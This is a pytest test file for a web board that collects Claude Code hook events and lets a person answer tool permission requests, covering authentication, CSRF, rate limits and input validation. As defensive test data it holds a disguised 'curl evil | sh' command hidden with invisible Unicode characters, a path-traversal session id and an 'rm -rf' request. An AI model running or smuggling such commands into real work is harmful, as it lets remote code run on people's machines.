import asyncio
import sqlite3

import httpx
import pytest

from crittersdeck import auth
from crittersdeck.server import Settings, create_app

PASSWORD = "correct horse battery"


@pytest.fixture
def app(tmp_path):
    return create_app(Settings(db_path=str(tmp_path / "t.db"), password_hash=auth.hash_password(PASSWORD), keepalive=0.05))


@pytest.fixture
async def client(app):
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://board.test") as c:
        yield c


async def sign_in(client):
    r = await client.post("/api/login", json={"password": PASSWORD})
    assert r.status_code == 200
    client.headers["x-csrf-token"] = r.json()["csrf"]


async def new_source(client, name="personal"):
    r = await client.post("/api/sources", json={"name": name, "color": "#ff5500"})
    assert r.status_code == 200, r.text
    return r.json()


def event(name, sid="s1", **kw):
    return {"hook_event_name": name, "session_id": sid, "cwd": "/home/me/project", **kw}


async def send(client, token, body):
    return await client.post("/ingest", json=body, headers={"authorization": f"Bearer {token}"})


async def board(client):
    r = await client.get("/api/state")
    assert r.status_code == 200
    return r.json()


# ---- ingest ------------------------------------------------------------------


async def test_ingest_updates_board(client):
    await sign_in(client)
    token = (await new_source(client))["token"]
    assert (await send(client, token, event("UserPromptSubmit", prompt="hello there"))).status_code == 200
    r = await send(client, token, event("PreToolUse", tool_name="Bash", tool_input={"command": "ls -la"}))
    assert r.status_code == 200 and r.json() == {}
    [s] = (await board(client))["sessions"]
    assert (s["status"], s["tool"], s["detail"], s["folder"]) == ("working", "Bash", "ls -la", "project")


async def test_ingest_rejects_bad_requests(client):
    await sign_in(client)
    token = (await new_source(client))["token"]
    assert (await send(client, "cd_wrong", event("Stop"))).status_code == 401
    assert (await client.post("/ingest", json=event("Stop"))).status_code == 401
    assert (await send(client, token, {"hook_event_name": "Stop"})).status_code == 400
    r = await client.post("/ingest", content=b"{not json", headers={"authorization": f"Bearer {token}"})
    assert r.status_code == 400
    big = event("PreToolUse", tool_input={"content": "x" * 300_000})
    assert (await send(client, token, big)).status_code == 413
    assert (await board(client))["sessions"] == []


async def test_ingest_rate_limit(client):
    await sign_in(client)
    token = (await new_source(client))["token"]
    codes = [(await send(client, token, event("PostToolUse"))).status_code for _ in range(40)]
    assert 429 in codes and codes[0] == 200


async def test_database_keeps_no_secrets(client, app, tmp_path):
    await sign_in(client)
    token = (await new_source(client))["token"]
    await send(client, token, event("UserPromptSubmit", prompt="TOP-SECRET-PROMPT"))
    await send(client, token, event("PreToolUse", tool_name="Write", tool_input={"file_path": "/x", "content": "FILE-BODY"}))
    await send(client, token, event("UserPromptSubmit", prompt="SECOND-PROMPT-NOT-KEPT"))
    dump = "\n".join(sqlite3.connect(tmp_path / "t.db").iterdump())
    assert token not in dump and "FILE-BODY" not in dump and "SECOND-PROMPT" not in dump
    assert "TOP-SECRET-PROMPT" in dump  # the first line of the first prompt names the session


# ---- approvals -------------------------------------------------------------------


async def ask(client, token, sid="s1"):
    return asyncio.create_task(send(client, token, event("PermissionRequest", sid, tool_name="Bash", tool_input={"command": "rm -rf build"})))


async def pending_id(client):
    for _ in range(100):
        sessions = (await board(client))["sessions"]
        if sessions and sessions[0]["pending"]:
            return sessions[0]["pending"]["id"]
        await asyncio.sleep(0.01)
    raise AssertionError("no pending request")


@pytest.mark.parametrize("decision", ["allow", "deny"])
async def test_permission_answered_from_board(client, decision):
    await sign_in(client)
    token = (await new_source(client))["token"]
    hook = await ask(client, token)
    rid = await pending_id(client)
    s = (await board(client))["sessions"][0]
    assert s["status"] == "needs_you" and s["pending"]["input"] == "rm -rf build"
    assert (await client.post(f"/api/approvals/{rid}", json={"decision": decision})).status_code == 200
    reply = (await hook).json()
    assert reply["hookSpecificOutput"]["decision"]["behavior"] == decision
    # A second answer to the same request does nothing.
    assert (await client.post(f"/api/approvals/{rid}", json={"decision": "allow"})).status_code == 409


async def test_answered_in_session_withdraws_request(client):
    await sign_in(client)
    token = (await new_source(client))["token"]
    hook = await ask(client, token)
    rid = await pending_id(client)
    await send(client, token, event("PostToolUse", tool_name="Bash"))  # the person answered in the app
    assert (await hook).json() == {}
    assert (await client.post(f"/api/approvals/{rid}", json={"decision": "allow"})).status_code == 409
    s = (await board(client))["sessions"][0]
    assert s["pending"] is None and s["status"] == "working"


async def test_permission_notification_keeps_request_open(client):
    await sign_in(client)
    token = (await new_source(client))["token"]
    hook = await ask(client, token)
    rid = await pending_id(client)
    await send(client, token, event("Notification", notification_type="permission_prompt", message="Claude needs your permission"))
    assert (await client.post(f"/api/approvals/{rid}", json={"decision": "allow"})).status_code == 200
    assert (await hook).json()["hookSpecificOutput"]["decision"]["behavior"] == "allow"


async def test_waiting_hook_gets_keepalive_whitespace(app):
    # Proxies close idle connections: the open hook request must keep sending bytes.
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://board.test") as c:
        await sign_in(c)
        token = (await new_source(c))["token"]
        hook = await ask(c, token)
        rid = await pending_id(c)
        await asyncio.sleep(0.2)
        await c.post(f"/api/approvals/{rid}", json={"decision": "allow"})
        r = await hook
        assert r.text.startswith(" ") and r.json()["hookSpecificOutput"]["decision"]["behavior"] == "allow"


# ---- board auth -------------------------------------------------------------------


async def test_board_requires_sign_in(client):
    assert (await client.get("/api/state")).status_code == 401
    assert (await client.post("/api/sources", json={"name": "x", "color": "#000000"})).status_code == 401
    assert (await client.post("/api/login", json={"password": "nope"})).status_code == 401


async def test_mutations_need_csrf_and_same_origin(client):
    await sign_in(client)
    csrf = client.headers.pop("x-csrf-token")
    assert (await client.post("/api/sources", json={"name": "x", "color": "#000000"})).status_code == 403
    r = await client.post("/api/sources", json={"name": "x", "color": "#000000"},
                          headers={"x-csrf-token": csrf, "origin": "https://evil.example"})
    assert r.status_code == 403
    r = await client.post("/api/sources", json={"name": "x", "color": "#000000"}, headers={"x-csrf-token": csrf})
    assert r.status_code == 200


async def test_trusted_proxy_header(tmp_path):
    with pytest.raises(SystemExit):  # the header alone is never trusted
        create_app(Settings(db_path=str(tmp_path / "p.db"), trust_proxy_header="X-Forwarded-User"))
    stranger = create_app(Settings(db_path=str(tmp_path / "q.db"), trust_proxy_header="X-Forwarded-User",
                                   trusted_proxies=("10.9.9.0/24",)))
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=stranger, client=("10.0.0.66", 1234)),
                                 base_url="http://board.test") as c:
        assert (await c.get("/api/me", headers={"X-Forwarded-User": "evil"})).status_code == 401
    app = create_app(Settings(db_path=str(tmp_path / "p.db"), trust_proxy_header="X-Forwarded-User",
                              trusted_proxies=("10.9.9.9",)))
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app, client=("10.9.9.9", 1234)),
                                 base_url="http://board.test") as c:
        assert (await c.get("/api/state")).status_code == 401
        me = (await c.get("/api/me", headers={"X-Forwarded-User": "rafa"})).json()
        assert me["user"] == "rafa"
        r = await c.post("/api/sources", json={"name": "w", "color": "#112233"},
                         headers={"X-Forwarded-User": "rafa", "x-csrf-token": me["csrf"]})
        assert r.status_code == 200
        assert (await c.post("/api/login", json={"password": "x"})).status_code == 404


async def test_source_validation_and_snippet(client):
    await sign_in(client)
    assert (await client.post("/api/sources", json={"name": "", "color": "#ffffff"})).status_code == 400
    assert (await client.post("/api/sources", json={"name": "ok", "color": "red"})).status_code == 400
    assert (await client.post("/api/sources", json={"name": ["a"], "color": "#ffffff"})).status_code == 400
    await new_source(client, "Twin")
    assert (await client.post("/api/sources", json={"name": "twin", "color": "#ffffff"})).status_code == 409
    created = await new_source(client, "work")
    hooks = created["settings"]["hooks"]
    assert set(hooks) >= {"PermissionRequest", "Stop", "PreToolUse"}
    hook = hooks["PermissionRequest"][0]["hooks"][0]
    assert hook["url"] == "http://board.test/ingest"
    assert hook["headers"]["Authorization"] == "Bearer " + created["token"]
    assert hook["timeout"] >= 3600


async def test_deleting_a_source_revokes_its_token(client):
    await sign_in(client)
    created = await new_source(client)
    await send(client, created["token"], event("Stop"))
    assert (await client.delete(f"/api/sources/{created['source']['id']}")).status_code == 200
    assert (await send(client, created["token"], event("Stop"))).status_code == 401
    assert (await board(client))["sessions"] == []


async def test_seen_and_forget(client):
    await sign_in(client)
    created = await new_source(client)
    await send(client, created["token"], event("Stop"))
    sid = created["source"]["id"]
    assert (await board(client))["sessions"][0]["status"] == "done_unseen"
    assert (await client.post(f"/api/sessions/{sid}/s1/seen")).status_code == 200
    assert (await board(client))["sessions"][0]["status"] == "idle"
    assert (await client.delete(f"/api/sessions/{sid}/s1")).status_code == 200
    assert (await board(client))["sessions"] == []


# ---- review follow-ups -----------------------------------------------------------


async def test_dropped_hook_connection_withdraws_request(app):
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://board.test") as c:
        await sign_in(c)
        token = (await new_source(c))["token"]
        hook = await ask(c, token)
        rid = await pending_id(c)
        hook.cancel()  # the hook's connection goes away (session answered, Claude closed...)
        with pytest.raises(asyncio.CancelledError):
            await hook
        for _ in range(100):
            if (await board(c))["sessions"][0]["pending"] is None:
                break
            await asyncio.sleep(0.01)
        assert (await board(c))["sessions"][0]["pending"] is None
        assert (await c.post(f"/api/approvals/{rid}", json={"decision": "allow"})).status_code == 409


async def test_sessions_survive_a_restart(tmp_path):
    settings = Settings(db_path=str(tmp_path / "r.db"), password_hash=auth.hash_password(PASSWORD))
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=create_app(settings)), base_url="http://b.test") as c:
        await sign_in(c)
        token = (await new_source(c))["token"]
        await send(c, token, event("Stop"))
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=create_app(settings)), base_url="http://b.test") as c:
        await sign_in(c)
        [s] = (await board(c))["sessions"]
        assert s["status"] == "done_unseen" and s["pending"] is None
        assert (await send(c, token, event("Stop"))).status_code == 200  # the token still works


async def test_board_answer_marks_session_working(client):
    await sign_in(client)
    token = (await new_source(client))["token"]
    hook = await ask(client, token)
    rid = await pending_id(client)
    await client.post(f"/api/approvals/{rid}", json={"decision": "allow"})
    await hook
    s = (await board(client))["sessions"][0]
    assert (s["status"], s["pending"]) == ("working", None)


async def test_ingest_caps_and_validation(client, monkeypatch):
    from crittersdeck import server

    await sign_in(client)
    token = (await new_source(client))["token"]
    assert (await send(client, token, event("Stop", sid="../../etc"))).status_code == 400
    r = await client.post("/ingest", content=b"{}", headers={"authorization": f"Bearer {token}", "content-length": "abc"})
    assert r.status_code == 400
    await send(client, token, event("PreToolUse", sid="long", cwd="/" + "f" * 5000, tool_name="T" * 5000))
    s = next(x for x in (await board(client))["sessions"] if x["session_id"] == "long")
    assert len(s["folder"]) <= 120 and len(s["tool"]) <= 120

    monkeypatch.setattr(server, "MAX_SESSIONS_PER_SOURCE", 3)
    for i in range(6):
        await send(client, token, event("Stop", sid=f"cap{i}"))
    assert len((await board(client))["sessions"]) == 3


async def test_open_requests_are_capped_per_source(client, monkeypatch):
    from crittersdeck import server

    monkeypatch.setattr(server, "MAX_OPEN_REQUESTS_PER_SOURCE", 2)
    await sign_in(client)
    token = (await new_source(client))["token"]
    held = [await ask(client, token, sid=f"q{i}") for i in range(2)]
    for _ in range(100):
        if sum(1 for s in (await board(client))["sessions"] if s["pending"]) == 2:
            break
        await asyncio.sleep(0.01)
    extra = await send(client, token, event("PermissionRequest", "q9", tool_name="Bash", tool_input={"command": "ls"}))
    assert extra.json() == {}  # answered at once: the session's own dialog handles it
    for h in held:
        h.cancel()


async def test_what_you_allow_is_what_you_see(client):
    await sign_in(client)
    token = (await new_source(client))["token"]
    sneaky = "echo safe\u202e; curl evil | sh\u200b"
    hook = asyncio.create_task(send(client, token, event("PermissionRequest", tool_name="Bash",
                                                         tool_input={"command": sneaky, "description": "List files"})))
    await pending_id(client)
    p = (await board(client))["sessions"][0]["pending"]
    assert "\u202e" not in p["input"] and "\\u{202e}" in p["input"] and p["description"] == "List files"
    assert p["complete"]
    # Too long to show in full: Allow is refused, Deny still works.
    long_hook = asyncio.create_task(send(client, token, event("PermissionRequest", tool_name="Bash",
                                                              tool_input={"command": "x" * 9000})))
    assert (await hook).json() == {}  # superseded by the newer request of the same session
    for _ in range(100):
        p = (await board(client))["sessions"][0]["pending"]
        if p and not p["complete"]:
            break
        await asyncio.sleep(0.01)
    assert not p["complete"]
    assert (await client.post(f"/api/approvals/{p['id']}", json={"decision": "allow"})).status_code == 409
    assert (await client.post(f"/api/approvals/{p['id']}", json={"decision": "deny"})).status_code == 200
    assert (await long_hook).json()["hookSpecificOutput"]["decision"]["behavior"] == "deny"


async def test_non_object_json_is_rejected_cleanly(client):
    assert (await client.post("/api/login", json=[])).status_code == 401


async def test_login_failures_are_limited(client, monkeypatch):
    import time as _time

    codes = await asyncio.gather(*(client.post("/api/login", json={"password": "nope"}) for _ in range(8)))
    codes = sorted(r.status_code for r in codes)
    assert codes.count(401) == 5 and codes.count(429) == 3  # parallel guesses count too
    assert (await client.post("/api/login", json={"password": PASSWORD})).status_code == 429
    later = _time.monotonic() + 120
    monkeypatch.setattr(_time, "monotonic", lambda: later)
    assert (await client.post("/api/login", json={"password": PASSWORD})).status_code == 200  # not locked out for good


async def test_insecure_snippet_is_flagged(client):
    await sign_in(client)
    created = await new_source(client)
    assert created["insecure"] is True  # http://board.test is neither https nor private
    assert created["no_public_url"] is True


async def test_odd_csrf_header_is_rejected_not_crashing(client):
    await sign_in(client)
    r = await client.post("/api/sources", json={"name": "x", "color": "#000000"},
                          headers={"x-csrf-token": b"\xe9\xe9"})
    assert r.status_code == 403


async def test_eviction_withdraws_open_request(client, monkeypatch):
    from crittersdeck import server

    monkeypatch.setattr(server, "MAX_SESSIONS_PER_SOURCE", 2)
    await sign_in(client)
    token = (await new_source(client))["token"]
    hook = await ask(client, token, sid="old")
    await pending_id(client)
    await send(client, token, event("Stop", sid="b"))
    await send(client, token, event("Stop", sid="c"))  # evicts "old", the quietest
    assert (await hook).json() == {}
    assert all(s["session_id"] != "old" for s in (await board(client))["sessions"])


def test_live_stream_does_not_keep_a_session_alive():
    from crittersdeck import auth as a

    sessions = a.Sessions()
    sid = sessions.create()
    t0 = sessions._by_sid[sid]["seen"]
    assert sessions.csrf(sid, now=t0 + a.IDLE_TTL - 1, touch=False)
    assert sessions.csrf(sid, now=t0 + a.IDLE_TTL + 1, touch=False) is None


async def test_install_commands_when_a_marketplace_is_set(tmp_path):
    app = create_app(Settings(db_path=str(tmp_path / "m.db"), password_hash=auth.hash_password(PASSWORD),
                              public_url="https://ingest.example.com", plugin_marketplace="https://git.example.com/me/crittersdeck"))
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://b.test") as c:
        await sign_in(c)
        created = await new_source(c)
        add, install = created["install"]
        assert add == "claude plugin marketplace add https://git.example.com/me/crittersdeck"
        assert "--config ingest_url=https://ingest.example.com " in install
        assert install.endswith("--config token=" + created["token"])


async def test_no_install_commands_without_marketplace(client):
    await sign_in(client)
    assert (await new_source(client))["install"] == []


def test_plugin_hooks_cover_every_event():
    import json
    from pathlib import Path

    from crittersdeck.snippet import EVENTS

    root = Path(__file__).parent.parent
    hooks = json.loads((root / "plugin/hooks/hooks.json").read_text())["hooks"]
    assert set(hooks) == set(EVENTS)
    for event, groups in hooks.items():
        [h] = groups[0]["hooks"]
        assert h["type"] == "command" and h["command"] == "curl"
        args = h["args"]
        assert "${user_config.ingest_url}/ingest" in args
        # the token comes from the hook's environment, never from argv
        assert "%CLAUDE_PLUGIN_OPTION_TOKEN" in args and not any("user_config.token" in a for a in args)
        # only the answer to a permission request may become hook output
        assert ("-o" in args) == (event != "PermissionRequest")
        assert "-fsS" in h["args"]
        assert h["args"][h["args"].index("${user_config.ingest_url}/ingest") - 1] == "--url"  # HTTP errors fail quietly (non-blocking), nothing is printed as hook output
        assert h["timeout"] >= (3600 if event == "PermissionRequest" else 5)
    manifest = json.loads((root / "plugin/.claude-plugin/plugin.json").read_text())
    assert manifest["userConfig"]["token"]["sensitive"] is True
    market = json.loads((root / ".claude-plugin/marketplace.json").read_text())
    assert market["name"] == "crittersdeck" and market["plugins"][0]["source"] == "./plugin"


async def test_trailing_slash_base_url_still_reaches_ingest(client):
    await sign_in(client)
    token = (await new_source(client))["token"]
    r = await client.post("http://board.test//ingest", json=event("Stop"), headers={"authorization": f"Bearer {token}"})
    assert r.status_code == 200


def test_settings_with_spaces_are_refused(tmp_path):
    with pytest.raises(SystemExit):
        create_app(Settings(db_path=str(tmp_path / "s.db"), password_hash="x", plugin_marketplace="C:/My Repos/cd"))


async def test_session_title_and_rename(client):
    await sign_in(client)
    created = await new_source(client)
    token, sid = created["token"], created["source"]["id"]
    await send(client, token, event("UserPromptSubmit", prompt="\n  Fix the   login bug\nand more details here"))
    await send(client, token, event("UserPromptSubmit", prompt="a later prompt"))
    assert (await board(client))["sessions"][0]["title"] == "Fix the login bug"
    assert (await client.patch(f"/api/sessions/{sid}/s1", json={"title": "  Login   fix "})).status_code == 200
    assert (await board(client))["sessions"][0]["title"] == "Login fix"
    assert (await client.patch(f"/api/sessions/{sid}/s1", json={"title": "x" * 81})).status_code == 400
    assert (await client.patch(f"/api/sessions/{sid}/s1", json={"title": "   "})).status_code == 400
    assert (await client.patch(f"/api/sessions/{sid}/nope", json={"title": "y"})).status_code == 404


def test_old_database_gets_title_column(tmp_path):
    db = tmp_path / "old.db"
    con = sqlite3.connect(db)
    con.executescript("""CREATE TABLE sources (id TEXT PRIMARY KEY, name TEXT NOT NULL, color TEXT NOT NULL,
        token_hash TEXT NOT NULL UNIQUE, created REAL NOT NULL);
        CREATE TABLE sessions (source_id TEXT NOT NULL REFERENCES sources(id) ON DELETE CASCADE,
        session_id TEXT NOT NULL, folder TEXT NOT NULL DEFAULT '', status TEXT NOT NULL, tool TEXT NOT NULL DEFAULT '',
        detail TEXT NOT NULL DEFAULT '', started REAL NOT NULL, updated REAL NOT NULL, PRIMARY KEY (source_id, session_id));
        INSERT INTO sources VALUES ('a','A','#000000','h',0);
        INSERT INTO sessions VALUES ('a','s1','f','idle','','',0,0);""")
    con.commit()
    con.close()
    from crittersdeck.store import Store

    assert Store(str(db)).session("a", "s1")["title"] == ""
